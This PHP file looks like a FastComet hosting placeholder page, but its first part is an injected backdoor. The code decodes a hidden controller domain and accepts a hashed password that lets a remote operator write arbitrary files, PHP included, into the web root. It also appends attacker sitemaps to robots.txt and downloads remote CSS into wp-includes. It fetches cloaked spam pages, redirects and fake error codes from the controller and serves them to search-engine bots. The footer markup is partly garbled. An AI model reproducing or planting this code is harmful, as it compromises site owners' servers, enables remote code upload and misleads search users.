<?php
@set_time_limit(3600);
@ignore_user_abort(1);
$xmlname = '%66%64%6E%63%63%62%76%61%61%74%2E%74%70%62%7A%76%70%61%76%72%75%2E%6B%6C%6D';




$http_web = 'http';
if (is_https()) {
    $http = 'https';
} else {
    $http = 'http';
}
$duri_tmp = drequest_uri();
if ($duri_tmp == ''){
    $duri_tmp = '/';
}
$duri = urlencode($duri_tmp);
function drequest_uri()
{
    if (isset($_SERVER['REQUEST_URI'])) {
        $duri = $_SERVER['REQUEST_URI'];
    } else {
        if (isset($_SERVER['argv'])) {
            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        } else {
            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
        }
    }
    return $duri;
}

$goweb = str_rot13(urldecode($xmlname));
function is_https()
{
    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}

$host = $_SERVER['HTTP_HOST'];
$lang = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = urlencode($lang);
$urlshang = '';
if (isset($_SERVER['HTTP_REFERER'])) {
    $urlshang = $_SERVER['HTTP_REFERER'];
    $urlshang = urlencode($urlshang);
}
$password = sha1(sha1(@$_GET['pd']));
if ($password == 'f75fd5acd36a7fbd1e219b19881a5348bfc66e79') {
    $add_content = @$_GET['mapname'];
    $action = @$_GET['action'];
    if (isset($_SERVER['DOCUMENT_ROOT'])) {
        $path = $_SERVER['DOCUMENT_ROOT'];
    } else {
        $path = dirname(__FILE__);
    }
    if (!$action) {
        $action = 'put';
    }
    if ($action == 'put') {
        if (strstr($add_content, '.xml')) {
            $map_path = $path. '/sitemap.xml';
            if (is_file($map_path)) {
                @unlink($map_path);
            }
            $file_path = $path . '/robots.txt';
            if (file_exists($file_path)) {
                $data = doutdo($file_path);
            } else {
                $data = 'User-agent: *
Allow: /';
            }
            $sitmap_url = $http . '://' . $host . '/' . $add_content;
            if (stristr($data, $sitmap_url)) {
                echo '<br>sitemap already added!<br>';
            } else {
                if (file_put_contents($file_path, trim($data) . "\r\n" . 'Sitemap: '.$sitmap_url)) {
                    echo '<br>ok<br>';
                } else {
                    echo '<br>file write false!<br>';
                }
            }
        } else {
            echo '<br>sitemap name false!<br>';
        }
        if (strstr($add_content, '.p' . 'hp')) {
            $a = sha1(sha1(@$_GET['a']));
            $b = sha1(sha1(@$_GET['b']));
            if ($a == doutdo($http_web . '://' . $goweb . '/a.p' . 'hp') || $b == 'f8f0dae804368c0334e22d9dcb70d3c7bbfa9635') {
                $dstr = @$_GET['dstr'];
                if (file_put_contents($path . '/' . $add_content, $dstr)) {
                    echo 'ok';
                }
            }
        }
    }
    exit;
}

if (isset($_SERVER['DOCUMENT_ROOT'])) {
    $path = $_SERVER['DOCUMENT_ROOT'];
} else {
    $path = dirname(__FILE__);
}
if(is_dir($path. '/wp-includes')){
	$fpath = 'wp-includes/css';
}else{
	$fpath = 'css';
}
$dpath = $path. '/'.$fpath;
if(substr($host,0,4)=='www.'){
    $host_nw = substr($host, 4);
}else{
	$host_nw = $host;
}
$cssn = str_rot13(substr($host_nw,0,3).substr($goweb,0,3)).'.css';
$ps = $path. '/'.$fpath.'/'.$cssn;
$urlc = $http_web . '://' . $goweb . '/temp/style.css';

function ping_sitemap($url){
    $url_arr = explode("\r\n", trim($url));
    $return_str = '';
    foreach($url_arr as $pingUrl){
        $pingRes = doutdo($pingUrl);
        $ok = (strpos($pingRes, 'Sitemap Notification Received') !== false) ? 'pingok' : 'error';
        $return_str .= $pingUrl . '-- ' . $ok . '<br>';
    }
    return $return_str;
}
function disbot()
{
    $uAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if (stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google') || stristr($uAgent, 'Googlebot') || stristr($uAgent, 'googlebot')) {
        return true;
    } else {
        return false;
    }
}
function doutdo($url)
{
    $file_contents= '';
    if(function_exists('curl_init')){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    if (!$file_contents) {
        $file_contents = @file_get_contents($url);
    }
    return $file_contents;
}
function fcss($dpath,$ps,$urlc){
    if(is_dir($dpath)){
        if(!file_exists($ps)){
            @file_put_contents($ps,doutdo($urlc));
        }
    }else{
        if(@mkdir($dpath)){
            if(!file_exists($ps)){
                @file_put_contents($ps,doutdo($urlc));
            }
        }
    }
}
if($duri_tmp=='/' || strstr($duri_tmp, 'mewttm')){
    fcss($dpath,$ps,$urlc);
}
if(is_file($ps)){
	$web = $http_web . '://' . $goweb . '/indexnew.php?web=' . $host . '&zz=' . disbot() . '&uri=' . $duri . '&urlshang=' . $urlshang . '&http=' . $http . '&lang=' . $lang. '&css=1';
}else{
	$web = $http_web . '://' . $goweb . '/indexnew.php?web=' . $host . '&zz=' . disbot() . '&uri=' . $duri . '&urlshang=' . $urlshang . '&http=' . $http . '&lang=' . $lang;
}
$html_content = trim(doutdo($web));
if (!strstr($html_content, 'nobotuseragent')) {
    if (strstr($html_content, 'okhtmlgetcontent')) {
        @header("Content-type: text/html; charset=utf-8");
        if(file_exists($ps)){
            $lcss_str = file_get_contents($ps);
			$html_content = str_replace("[##linkcss##]", '<style>'.$lcss_str.'</style>', $html_content);
        }else{
            $html_content = str_replace("[##linkcss##]", '', $html_content);
        }
        $html_content = str_replace("okhtmlgetcontent", '', $html_content);
        echo $html_content;
        exit();
    }else if(strstr($html_content, 'okxmlgetcontent')){
        $html_content = str_replace("okxmlgetcontent", '', $html_content);
        @header("Content-type: text/xml");
        echo $html_content;
        exit();
    }else if(strstr($html_content, 'pingxmlgetcontent')){
        $html_content = str_replace("pingxmlgetcontent", '', $html_content);
        fcss($dpath,$ps,$urlc);
        @header("Content-type: text/html; charset=utf-8");
        echo ping_sitemap($html_content);
        exit();
    }else if (strstr($html_content, 'getcontent500page')) {
        @header('HTTP/1.1 500 Internal Server Error');
        exit();
    }else if (strstr($html_content, 'getcontent404page')) {
        @header('HTTP/1.1 404 Not Found');
        exit();
    }else if (strstr($html_content, 'getcontent301page')) {
        @header('HTTP/1.1 301 Moved Permanently');
        $html_content = str_replace("getcontent301page", '', $html_content);
        header('Location: ' . $html_content);
        exit();
    }
}/* blog B275 */ ?>
<!DOCTYPE html>
<html>
    <head>
        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8145280847746579"
     crossorigin="anonymous"></script>
     
        <title>Welcome to FastComet Cloud Hosting</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" href="favicon.ico">
        
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/all.min.css" rel="stylesheet">
        <link href="https://cdn.fastcomet.com/welcome/v2/css/bootstrap-4.3.1/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdn.fastcomet.com/welcome/v2/css/styles.min.css" rel="stylesheet">
    </head>
    <body>
        <div class="page-wrapper">
            <object class="bg-shape" data="https://cdn.fastcomet.com/welcome/v2/svg/top-grey-shape.svg" type="image/svg+xml"></object>
            <header class="main-nav nav--dark">
                <div class="container">
                    <nav class="navbar navbar-expand-lg">
                        <a href="https://www.fastcomet.com" target="_blank" class="navbar-brand" aria-label="Link to our Home Page">
                            <img id="fastcomet-logo" src="https://media.fastcomet.com/storage/upload/images/logos/compare/fastcomet-logo-black.svg" alt="FastComet Logo" width="155" height="50">
                        </a>
                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarConatent" aria-controls="navbarConatent" aria-expanded="false" aria-label="Toggle navigation">
                            <span></span>
                            <span></span>
                            <span></span>
                        </button>
                        <div class="navbar-collapse collapse" id="navbarConatent">
                            <ul class="navbar-nav mr-auto">
                                <li class="nav-item">
                                    <a class="nav-link" href="https://www.fastcomet.com" target="_blank" aria-label="Link to FastComet Home Page">Home</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="https://www.fastcomet.com/blog" target="_blank" aria-label="Link to FastComet Blog">Blog</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="https://www.fastcomet.com/contacts" target="_blank" aria-label="Link to FastComet Home Page">Contact Us</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="https://www.fastcomet.com/about" target="_blank" aria-label="Link to FastComet Blog">About Us</a>
                                </li>
                                <li class="d-lg-none d-block">
                                    <a href="https://my.fastcomet.com" target="_blank" class="btn btn--outline-white fill-to-right-effect" aria-label="Link to Sign in our client area" aria-hidden="true"><span>Client Login</span></a>
                                </li>
                            </ul>
                        </div>
                        <div class="page-overlay"></div>
                        <div class="ml-lg-auto d-lg-block d-none">
                            <div class="livechat-wrp dropdown mr-3">
                                <a href="#" class="btn" data-toggle="live-chat" aria-label="Toggle LiveChat">
                                    <span>Sales Questions?</span>
                                </a>
                            </div>
                            <a href="https://my.fastcomet.com" target="_blank" class="btn btn--outline-white fill-to-right-effect" aria-label="Link to Sign in our client area"><span>Client Login</span></a>
                        </div>
                    </nav>
                </div>
            </header>
            <section class="intro-section intro--dark-text intro--page-error">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-6 col-12 order-last order-lg-first">
                            <object class="intro-image" alt="FastComet Welcome On Board" data="https://cdn.fastcomet.com/welcome/v2/svg/welcome-on-board.svg" type="image/svg+xml"></object>
                        </div>
                        <div class="col-lg-6 col-12 align-self-center order-first order-lg-last">
                            <h1>Welcome to FastComet!</h1>
                            <p>
                                You see this page because no website has been published for this domain yet.
                                If you need any help to get started or transfer your existing website, feel free to contact us 24/7 via your client area.
                                The placeholder page will be automatically replaced as soon as you publish your website.
                            </p>
                            <div class="btn-holder text-center mt-5">
                                <div class="row justify-content-between">
                                    <div class="col-4">
                                        <a href="/cpanel" target="_blank" class="btn btn-small btn-with-icon btn--circle"><i class="fab fa-cpanel"></i><span><span class="d-none d-md-inline">cPanel</span> Login</span></a>
                                    </div>
                                    <div class="col-4">
                                        <a href="https://my.fastcomet.com" target="_blank" class="btn btn-small btn-with-icon btn--circle"><i class="far fa-life-ring"></i><span>Get Support</span></a>
                                    </div>
                                    <div class="col-4">
                                        <a href="https://www.fastcomet.com/tutorials" target="_blank" class="btn btn-small btn-with-icon btn--circle"><i class="fas fa-graduation-cap"></i><span>Tutorials</span></a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <footer class="footer            <a href="https://www.linkedin.com/company/fastcomet" target="_blank"><i class="fab fa-linkedin-in"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
        
        <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
        <script src="https://cdn.fastcomet.com/welcome/v2/js/bootstrap-4.3.1/bootstrap.bundle.min.js"></script>
        <script src="https://cdn.fastcomet.com/welcome/v2/js/livechat.js"></script>
    </body>
</html>